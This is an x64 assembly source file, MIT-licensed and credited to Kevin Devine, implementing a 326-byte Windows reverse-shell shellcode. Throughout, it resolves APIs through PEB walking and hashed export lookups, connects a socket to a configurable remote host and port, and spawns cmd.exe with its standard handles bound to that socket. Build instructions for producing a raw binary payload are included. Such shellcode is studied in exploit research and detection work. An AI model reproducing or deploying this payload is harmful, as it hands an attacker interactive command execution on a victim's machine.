 ;
 ;  The MIT License:
 ;
 ;  Copyright (c) Feb 2014 Kevin Devine
 ;
 ;  Permission is hereby granted,  free of charge,  to any person obtaining a
 ;  copy of this software and associated documentation files (the "Software"),
 ;  to deal in the Software without restriction,  including without limitation
 ;  the rights to use,  copy,  modify,  merge,  publish,  distribute,
 ;  sublicense,  and/or sell copies of the Software,  and to permit persons to
 ;  whom the Software is furnished to do so,  subject to the following
 ;  conditions:
 ;
 ;  The above copyright notice and this permission notice shall be included in
 ;  all copies or substantial portions of the Software.
 ;
 ;  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 ;  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 ;  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 ;  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 ;  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,
 ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 ;  OTHER DEALINGS IN THE SOFTWARE.
 
  ; Requires Win32Inc header files and JWASM from Japheth
  ; POLINK or LINK from MSVC including LIB files from either compiler.
  ;
  ;
  ; To generate an EXE:
  ;
  ; jwasm -DTEST_CODE -Zp8 -win64 -I .\WinInc208\Include rev_overlap64.asm
  ; link /subsystem:console rev_overlap64.obj
  ;
  ;
  ; To generate binary: 
  ; 
  ; jwasm -Zp8 -bin -I .\WinInc208\Include rev_overlap64.asm
  ;
  ; Current size: 326 bytes
  ;

  .x64
  ifndef TEST_CODE
    .model flat, fastcall
  endif
  
  includelib ws2_32.lib
  includelib kernel32.lib
  
  option casemap:none
  
  .nolist
  .nocref
WIN32_LEAN_AND_MEAN equ 1
  include windows.inc
  include winsock2.inc
  .list
  .cref
  
  REMOTE_IP    equ 00100007Fh  ; 127.0.0.1
  REMOTE_PORT  equ 80
  ROL_CONSTANT equ 7
  
  mrol macro iNum:req, iBits:req
    exitm <((iNum shl iBits) and 0FFFFFFFFh) or (iNum shr (32-iBits))>
  endm

  hashapi macro szApi
    local dwApi

    dwApi = 0

    forc x, szApi
      if '&x' ne '"'
        dwApi = mrol((dwApi + '&x'), ROL_CONSTANT) xor '&x'
      endif
    endm
    dwApi = mrol(dwApi, ROL_CONSTANT)
    ifdef USE_16
      dw (dwApi and 0FFFFh)
    else
      dd (dwApi and 0FFFFFFFFh)
    endif
  endm
  
  mhtons macro A:req
    exitm <(((A and 0000000000000FF00h) shr 8) or \
           (((A and 000000000000000FFh) shl 8))) and 0FFFFFFFFFFFFFFFFh>
  endm

  PUSHAQ_STRUCT struc
    _rdi  QWORD  ?
    _rsi  QWORD  ?
    _rbp  QWORD  ?
    ;_rsp  QWORD  ?
    _rbx  QWORD  ?
    _rdx  QWORD  ?
    _rcx  QWORD  ?
    _rax  QWORD  ?
  PUSHAQ_STRUCT ends
    
  pushaq macro
    push   rax
    push   rcx
    push   rdx
    push   rbx
    ;push   rsp
    push   rbp
    push   rsi
    push   rdi
  endm
  
  popaq macro
    pop   rdi
    pop   rsi
    pop   rbp
    ;pop   rsp
    pop   rbx
    pop   rdx
    pop   rcx
    pop   rax
  endm
  
  HOME_SPACE struct
    _rcx  QWORD ?
    _rdx  QWORD ?
    _r8   QWORD ?
    _r9   QWORD ?
  HOME_SPACE ends
  
  ; Structure to represent values on stack
  ; Use -Zp8 switch in JWASM to align structures by 8 bytes
  SHELLCODE_SPACE struct
    hs                   HOME_SPACE           <>
    ; parameters to WSASocketA and CreateProcess
    union
      dwFlags              QWORD               ?
      bInheritHandles      BOOL                ?
    ends
    
    union
      g                    QWORD               ?
      dwCreationFlags      QWORD               ?
    ends
    
    ; stack parameters to CreateProcess
    lpEnvironment        LPVOID                ?
    lpCurrentDirectory   LPCTSTR               ?
    lpStartupInfo        LPSTARTUPINFO         ?
    lpProcessInformation LPPROCESS_INFORMATION ?
    ; now the actual structures and pointer to "cmd", 0
    cmd                  LPCTSTR               ?
    sin$                 SOCKADDR_IN          <>
    si$                  STARTUPINFO          <>
    pi$                  PROCESS_INFORMATION  <>
  SHELLCODE_SPACE ends
  
  STACK_SIZE equ ((sizeof(SHELLCODE_SPACE) and -16) + 16) - 8
  
  .CODE

entrypoint:
ifdef TEST_CODE
  .DATA
    wsa WSADATA <>
  .CODE
    mov    eax, code_end - code_start

    lea    rdx, [wsa]
    push   MAKEWORD(2, 0)
    pop    rcx
    call   WSAStartup

    call   code_start

    xor    eax, eax
    call   ExitProcess
endif

code_start:
    ; save non-volatile registers
    push   rbx
    push   rsi
    push   rdi
    push   rbp
    push   r12
    push   r13
    push   r14
    push   r15
    mov    r15, rsp
    and    rsp, -16
    sub    rsp, 28h
    stc
    jmp    exec_cmd
calc_position:
    pop    rsi            ; rsi has pointer to our hashes
                          ; load relative address of our API retrieval routine
    lea    rbp, [rsi + (offset get_proc_address - offset data_section)]

    ; allocate space for API parameters
    ; and zero initialize    
    xor    eax, eax
    cdq
    mov    dl, STACK_SIZE
    sub    esp, edx
    mov    ecx, edx
    mov    rdi, rsp 
    rep    stosb
    
    ; initialize "cmd" string
    mov    eax, not 'dmc'
    not    eax
    lea    rdi, [rsp][SHELLCODE_SPACE.cmd]
    mov    r12, rdi
    stosq
    
    ; initialize SOCKADDR_IN
    mov    r13, rdi
    lodsq
    not    rax
    stosq
    scasq
    mov    r14, rdi
    push   sizeof (STARTUPINFO)
    pop    rax
    stosd
    inc    [r14][STARTUPINFO.dwFlags+1]              ; STARTF_USESTDHANDLES
    mov    [rsp][SHELLCODE_SPACE.lpStartupInfo], r14
    lea    rdi, [r14][STARTUPINFO.hStdInput]

    ; create socket
    xor    r9, r9
    xor    r8, r8
    mov    dl, SOCK_STREAM
    mov    cl, AF_INET
    call   rbp           ; WSASocketA
    
    ; store as IO handle for cmd.exe
    stosq      ; hStdInput  = s
    stosq      ; hStdOutput = s
    stosq      ; hStdError  = s
    
    scasq      ; if structures aligned by 8 bytes, we need to skip 8 here
    
    xchg   eax, ebx
    mov    [rsp][SHELLCODE_SPACE.lpProcessInformation], rdi
    inc    [rsp][SHELLCODE_SPACE.bInheritHandles]
    
    ; connect to host
    push   sizeof (SOCKADDR_IN)
    pop    r8                      
    mov    rdx, r13              
    mov    ecx, ebx
    call   rbp           ; connect
    clc
    
exec_cmd:
    jc     load_data
    
    xor    r8,  r8
    xor    r9,  r9
    mov    rdx, r12
    xchg   ecx, eax      ; assumes eax is zero
    call   rbp           ; CreateProcessA
    
    ; wait for exit
    or     edx, -1
    mov    rcx, [rdi]
    call   rbp           ; WaitForSingleObject
    
    ; close thread handle
    mov    rcx, [rdi]
    call   rbp           ; CloseHandle
    
    ; close process handle
    mov    rcx, [rdi+8]
    call   rbp           ; CloseHandle
    
    ; close socket handle
    mov    ecx, ebx
    call   rbp           ; closesocket
    
    ; fix up stack, restore non-volatile registers and return
    mov    rsp, r15
    pop    r15
    pop    r14
    pop    r13
    pop    r12
    pop    rbp
    pop    rdi
    pop    rsi
    pop    rbx
    ret

load_data:
    call   calc_position
; not really data section as we're in same segment
data_section label qword
ifdef TEST_CODE
    dq     not ((((mhtons(REMOTE_PORT)) shl 16) or AF_INET) or (REMOTE_IP shl 32))
else
    dq     0
endif
    hashapi "WSASocketA"
    hashapi "connect"
    hashapi "CreateProcessA"
    hashapi "WaitForSingleObject"
    hashapi "CloseHandle"
    hashapi "CloseHandle"
    hashapi "closesocket"
    
get_proc_address proc near 
    lodsd
    pushaq
    
    push   60h
    pop    rsi
    lods   qword ptr gs:[rsi]
    mov    rax, [rax+18h]
    mov    r10, [rax+30h]
load_dll:
    mov    rbp, [r10+10h]
    mov    r10, [r10]
    
    mov    eax, [rbp+3Ch]      ; IMAGE_DOS_HEADER.e_lfanew
    add    eax, 10h
    mov    eax, [rbp+rax+78h]  ; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    lea    rsi, [rbp+rax+18h]  ; IMAGE_EXPORT_DIRECTORY.NumberOfNames
    lodsd
    xchg   eax, ecx
    jecxz  load_dll

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    lea    r11, [rbp+rax]

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNames
    lea    rdi, [rbp+rax]

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
    lea    rbx, [rbp+rax]
load_api:
    mov    esi, [rdi+4*rcx-4]
    add    rsi, rbp
    xor    eax, eax
    cdq
hash_api:
    lodsb
    add    edx, eax
    rol    edx, ROL_CONSTANT
    xor    edx, eax
    dec    eax
    jns    hash_api
    
    cmp    rdx, [rsp][PUSHAQ_STRUCT._rax]
    loopne load_api
    jne    load_dll
    
    movzx  edx, word ptr [rbx+2*rcx]
    mov    eax, [r11+4*rdx]
    add    rbp, rax
    mov    [rsp][PUSHAQ_STRUCT._rax], rbp
    popaq
    jmp    rax
    ret
get_proc_address endp

code_end label qword

    end entrypoint
  
